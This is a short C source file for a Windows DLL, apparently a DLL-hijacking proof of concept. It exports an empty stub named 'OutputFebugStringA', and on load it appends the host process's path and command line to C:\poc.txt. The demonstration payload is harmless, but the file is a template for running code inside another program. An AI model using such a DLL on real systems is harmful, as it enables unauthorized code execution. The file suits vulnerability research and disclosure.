#include "dll.h"
#include <windows.h>
#include <psapi.h>
DLLIMPORT void OutputFebugStringA(){}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	if(fdwReason==DLL_PROCESS_ATTACH)
	{
		char module_fname[MAX_PATH];
		memcpy(module_fname,"",MAX_PATH);
		LPSTR command_line = GetCommandLineA();
		GetModuleFileNameA(NULL, module_fname, MAX_PATH);
		HANDLE hFile = CreateFile("C:\\poc.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD bytesWritten; char lf[] = "\n"; char left_bracket[] =" [ "; char right_bracket[] =" ] ";
		if (hFile != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(hFile, 0, NULL, FILE_END); 
			WriteFile(hFile, module_fname, strlen(module_fname), &bytesWritten, NULL);
			WriteFile(hFile, left_bracket , strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, command_line, strlen(command_line), &bytesWritten, NULL);
			WriteFile(hFile, right_bracket , strlen(left_bracket), &bytesWritten, NULL);
			WriteFile(hFile, lf, 1, &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}
	return TRUE;
}

